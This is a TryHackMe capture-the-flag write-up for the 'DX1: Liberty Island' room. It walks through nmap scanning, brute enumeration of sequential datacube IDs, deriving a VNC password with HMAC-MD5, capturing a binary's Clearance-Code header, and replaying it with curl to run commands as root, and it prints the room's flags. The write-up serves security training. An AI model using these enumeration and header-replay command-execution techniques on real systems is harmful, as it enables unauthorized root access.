# DX1: Liberty Island

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Room | [DX1: Liberty Island](https://tryhackme.com/room/dx1libertyislandplde) |
| Difficulty | Medium |
| OS | Ubuntu Linux (Chicago95 / Windows 95 themed desktop) |
| Tags | IDOR, HMAC, VNC, traffic interception, command injection |
| Date | 2026-09-01 |

> Can you help the NSF get a foothold in UNATCO's system?

Deus Ex-themed box. Do not brute-force authentication; the services lock out. User access is VNC derived from an HMAC, root is unauthenticated command execution on an internal C2 port once the clearance header is known.

## Contents

- [Reconnaissance](#reconnaissance)
- [Web enumeration](#web-enumeration)
- [Datacube IDOR](#datacube-idor)
- [VNC password](#vnc-password)
- [User flag](#user-flag)
- [Command and control on 23023](#command-and-control-on-23023)
- [Root flag](#root-flag)
- [Remediation](#remediation)

## Reconnaissance

```bash
nmap -Pn -sV -sC -p 22,80,5901,23023 TARGET
```

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
5901/tcp  open  vnc     VNC (protocol 3.8)
23023/tcp open  http    UNATCO Command/Control
```

Port 23023 answers:

```text
UNATCO Liberty Island - Command/Control
RESTRICTED: ANGEL/OA
send a directive to process
```

A GET with no `Clearance-Code` does not execute anything. The header is recovered later from the desktop helper binary.

## Web enumeration

```bash
curl http://TARGET/robots.txt
```

```text
# Disallow: /datacubes # why just block this? no corp should crawl our stuff - alex
Disallow: *
```

`/badactors.html` embeds `/badactors.txt` and is signed by `AJacobson//UNATCO.00013.76490`. The list is a set of usernames. `jlebedev` is the only `jl*` entry, which matters for the VNC note below.

## Datacube IDOR

Datacube IDs are four-digit zero-padded integers. Only a handful exist:

```bash
seq -w 0000 9999 > ids.txt
gobuster dir -u http://TARGET/datacubes/ -w ids.txt -t 40
```

```text
/0000
/0011
/0068
/0103
/0233
/0451
```

`/datacubes/0451/` is the one that matters:

```text
I've set up VNC on this machine under jacobson's account.
...
The VNC login is the following message, 'smashthestate', hmac'ed with my
username from the 'bad actors' list (lol).
Use md5 for the hmac hashing algo. The first 8 characters of the final
hash is the VNC password.

- JL
```

## VNC password

HMAC-MD5, key = `jlebedev`, message = `smashthestate`:

```python
import hmac, hashlib
print(hmac.new(b"jlebedev", b"smashthestate", hashlib.md5).hexdigest())
```

```text
311781a1830c1332a903920a59eb6d7a
```

VNC password is the first eight hex characters: `311781a1`.

```bash
vncviewer TARGET:5901
# password: 311781a1
```

The session is Alex Jacobson's desktop (Chicago95). `user.txt` and `badactors-list` sit on the Desktop.

## User flag

```bash
cat /home/ajacobson/Desktop/user.txt
```

The same file can be read later through the C2 endpoint:

```bash
curl -X POST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' \
  --data-urlencode 'directive=cat /home/ajacobson/Desktop/user.txt' \
  http://TARGET:23023/
```

```text
thm{6ae787a98fff512ae33335e1264f0dd3}
```

## Command and control on 23023

`badactors-list` is an ELF 64-bit Go binary. It POSTs to `http://UNATCO:23023/` with a custom header. Capture the request in either of two ways.

On the VNC host, proxy the binary through netcat:

```bash
export http_proxy=127.0.0.1:4444
# other terminal:
nc -lnvp 4444
./badactors-list
```

On the attacker machine, add `TARGET UNATCO` to `/etc/hosts`, run the binary locally, and inspect the POST in Wireshark or tcpdump.

Captured request:

```http
POST / HTTP/1.1
Host: UNATCO:23023
User-Agent: Go-http-client/1.1
Clearance-Code: 7gFfT74scCgzMqW4EQbu
Content-Type: application/x-www-form-urlencoded

directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt
```

`directive` is passed to a shell as root. Replay it:

```bash
curl -X POST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' \
  --data-urlencode 'directive=whoami' \
  http://TARGET:23023/
```

```text
root
```

Compound shell operators are unreliable here. Send one command per request.

```bash
curl -X POST -H 'Clearance-Code: 7gFfT74scCgzMqW4EQbu' \
  --data-urlencode 'directive=cat /root/root.txt' \
  http://TARGET:23023/
```

## Root flag

```text
thm{985bb3c88bfe66f9b465b00198692866}
```

## Remediation

- Do not hide archives only in `robots.txt`. `/datacubes/` is an IDOR over sequential IDs.
- Do not document VNC setup, HMAC construction, or usernames in world-readable notes.
- Do not expose an HTTP C2 listener that runs `directive` as root. Authenticate with a rotating secret, not a static header baked into a desktop binary.
- Treat `Clearance-Code` as a credential. It is recoverable from any copy of `badactors-list`.
